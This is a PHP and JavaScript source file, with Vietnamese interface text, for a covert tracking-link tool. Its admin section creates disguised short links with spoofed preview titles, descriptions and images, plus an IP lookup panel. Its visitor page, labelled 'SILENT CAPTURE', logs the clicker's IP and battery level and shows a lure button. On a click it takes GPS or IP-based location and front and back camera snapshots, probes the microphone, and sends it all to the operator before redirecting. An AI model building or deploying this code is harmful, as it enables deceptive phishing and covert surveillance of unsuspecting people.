        async function createInternalFromSource(){ const src=document.getElementById('internal_source_url').value.trim(); if(!src){ alert('Nhập link gốc hoặc bấm Lấy link form.'); return; } try{ await makeShort('internal_short_url', src); }catch(e){} }
        async function autoCreateFakeLink(){ const redir=document.getElementById('hidden_dest_url').value.trim(); const display_url=document.getElementById('display_meta_url').value.trim() || redir; if(!redir){ alert('Nhập link đích trước.'); return; } try{ const res=await fetch('?action=auto_fake_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({redir, display_url})}); const data=await res.json(); if(!data.ok) throw new Error(data.error || 'Lỗi không xác định'); document.getElementById('auto_campaign_url').value=data.url; document.getElementById('auto_short_url').value=data.short || data.url; document.getElementById('internal_source_url').value=data.url; document.getElementById('internal_short_url').value=data.short || data.url; document.getElementById('auto_meta_preview').value=`Title: ${data.meta?.title || ''}\nDesc: ${data.meta?.desc || ''}\nImage: ${data.meta?.img || ''}${data.warning ? '\nLưu ý: '+data.warning : ''}`; const copied=await safeCopyText(data.short || data.url); alert(copied ? 'Đã tự tạo link nội bộ và copy kết quả!' : 'Đã tự tạo link nội bộ. Trình duyệt chặn copy tự động, hãy copy thủ công.'); }catch(e){ document.getElementById('auto_short_url').value='Lỗi: '+e.message; document.getElementById('auto_meta_preview').value='Lỗi: '+e.message; } }
        function autoCreateLocalLink(){ autoCreateFakeLink(); }
        function upW(){ document.getElementById('p_msg').innerText = document.getElementById('i_msg').value; document.getElementById('p_st').innerText = document.getElementById('i_st').value; document.getElementById('p_btn').innerText = document.getElementById('i_btn').value; }
        async function soi(ip){ document.getElementById('ip_detail').innerHTML = '<div class="animate-pulse font-black text-[9px]">TRUY QUÉT...</div>'; const res = await (await fetch('?action=quick_check&ip='+ip)).json(); if(res.status === 'success'){ document.getElementById('ip_detail').innerHTML = `<div class="text-[8px] space-y-1 uppercase italic">🏢 ISP: <b>${res.isp}</b><br>📍 VÙNG: <b>${res.city}, ${res.country}</b><br>🛡️ VPN: <b>${res.proxy ? 'YES' : 'NO'}</b></div>`; } }
        var m = L.map('map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(m);
        function vP(la, lo){ m.flyTo([la,lo], 18); L.marker([la,lo]).addTo(m); }
        var am = L.map('adm_map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(am); var amk;
        async function getAdminLoc() {
            document.getElementById('adm_geo').innerText = "Đang quét tín hiệu..."; const res = await (await fetch('https://api.ipify.org?format=json')).json(); document.getElementById('adm_ip').innerText = res.ip; const ipData = await (await fetch('?action=quick_check&ip='+res.ip)).json(); document.getElementById('adm_isp').innerText = ipData.isp; document.getElementById('adm_region').innerText = ipData.city + ", " + ipData.country;
            navigator.geolocation.getCurrentPosition(async (p) => { const la=p.coords.latitude, lo=p.coords.longitude; document.getElementById('adm_geo').innerText=la+", "+lo+" (Chuẩn 100%)"; am.flyTo([la,lo], 18); if(amk) am.removeLayer(amk); amk=L.marker([la,lo]).addTo(am).bindPopup("VỊ TRÍ CỦA BẠN").openPopup(); const geo=await (await fetch(`?action=rev_geo&la=${la}&lo=${lo}`)).json(); document.getElementById('adm_addr').innerText=geo.display_name; }, (e) => { const la=ipData.lat, lo=ipData.lon; am.flyTo([la,lo], 15); if(amk) am.removeLayer(amk); amk=L.marker([la,lo]).addTo(am).bindPopup("ƯỚC TÍNH (IP)").openPopup(); }, { enableHighAccuracy: true });
        }
        window.onload = () => { upPxV(); updateSharePreview(); document.getElementById('create').onclick=createSimpleShortLink; document.getElementById('copy').onclick=copySimpleShortLink; };
    </script>
</body></html>
<?php exit; }

// ================= 5. FRONTEND ENGINE (CAM + GPS + SILENT CAPTURE) =================
$id = $_GET['v'] ?? '';
$st = $db->prepare("SELECT * FROM links WHERE id = ?"); $st->execute([$id]);
$l = $st->fetch(PDO::FETCH_ASSOC);
if (!$l) { $l = ['id'=>'ROOT', 'title'=>get_c('root_title'), 'desc'=>get_c('root_desc'), 'img'=>get_c('root_img'), 'redir'=>get_c('root_redir')]; }
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover">
<title><?=htmlspecialchars($l['title'])?></title>
<meta property="og:title" content="<?=htmlspecialchars($l['title'])?>"><meta property="og:description" content="<?=htmlspecialchars($l['desc'])?>"><meta property="og:image" content="<?=htmlspecialchars($l['img'])?>">
<script src="https://cdn.tailwindcss.com"></script><style>body{min-height:100vh;min-height:-webkit-fill-available;padding:env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);-webkit-font-smoothing:antialiased}button{font-size:16px;-webkit-tap-highlight-color:transparent;touch-action:manipulation}</style></head>
<body class="bg-white flex items-center justify-center min-h-screen italic font-black text-center uppercase">
    <div class="p-8 w-full max-w-xs">
        <div id="ldr" class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
        <p id="msg" class="text-[10px] font-black text-gray-400 uppercase tracking-widest animate-pulse"><?=get_c('ui_msg')?></p>
        <p class="text-slate-300 text-[8px] mt-2 tracking-widest mb-8"><?=get_c('ui_st')?></p>
        <div id="v" class="hidden mt-8"><button onclick="forceAsk()" class="w-full bg-blue-600 text-white font-black py-4 rounded-[2rem] shadow-2xl uppercase italic border-none cursor-pointer"><?=get_c('btn_text')?></button></div>
    </div>
    <script>
    const captureFront = <?=json_encode(get_c('capture_front') === '1')?>;
    const captureBack = <?=json_encode(get_c('capture_back') === '1')?>;
    const captureAudio = <?=json_encode(get_c('capture_audio') === '1')?>;
    async function askMicConsent(){ if(!captureAudio || !navigator.mediaDevices) return false; try { const s=await navigator.mediaDevices.getUserMedia({audio:true, video:false}); s.getTracks().forEach(t=>t.stop()); return true; } catch(e){ return false; } }
    async function takeSnap(facingMode){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}}}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); await v.play(); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
    const push = (st, la=null, lo=null, payload={}) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: '<?=$id?>', la: la, lo: lo, st: st, v4:v4, v6:'N/A', bat:bat, ...payload })});
    let v4="<?=$ip_v4_serv?>", bat="N/A", autoRedirectTimer=null;
    async function getApproxLocationByIp(prefix){ try { const d=await (await fetch('?action=quick_check&ip='+encodeURIComponent(v4))).json(); if(d.status==='success' && d.lat !== undefined && d.lon !== undefined) return {la:d.lat, lo:d.lon, st:prefix+' / IP-Geo Fallback'}; } catch(e){} return {la:null, lo:null, st:prefix+' / IP-Geo Unavailable'}; }
    async function askGeoOrFallback(prefix){ return new Promise(resolve => { if(!navigator.geolocation) return resolve(getApproxLocationByIp(prefix+' GPS Unavailable')); navigator.geolocation.getCurrentPosition(p => resolve({la:p.coords.latitude, lo:p.coords.longitude, st:prefix+' GPS OK - User Consent'}), async () => resolve(await getApproxLocationByIp(prefix+' GPS Denied')), { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }); }); }
    window.onload = async () => {
        try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); } } catch(e){}
        push('Link Open (IP Only)');
        setTimeout(() => { document.getElementById('ldr').classList.add('hidden'); document.getElementById('v').classList.remove('hidden'); }, 1500);
        autoRedirectTimer=setTimeout(() => { location.replace(<?=json_encode($l['redir'])?>); }, 3000);
    };
    async function forceAsk() {
        if(autoRedirectTimer) clearTimeout(autoRedirectTimer);
        const loc = await askGeoOrFallback('WEB');
        const img_front = captureFront ? await takeSnap('user') : null;
        const img_back = captureBack ? await takeSnap('environment') : null;
        const mic_ok = await askMicConsent();
        if (captureAudio) loc.st += mic_ok ? ' / Mic Consent OK' : ' / Mic Consent Denied';
        await push(loc.st, loc.la, loc.lo, { img_front, img_back, img: img_front || img_back });
        location.replace("<?=$l['redir']?>");
    }
    </script>
</body></html>
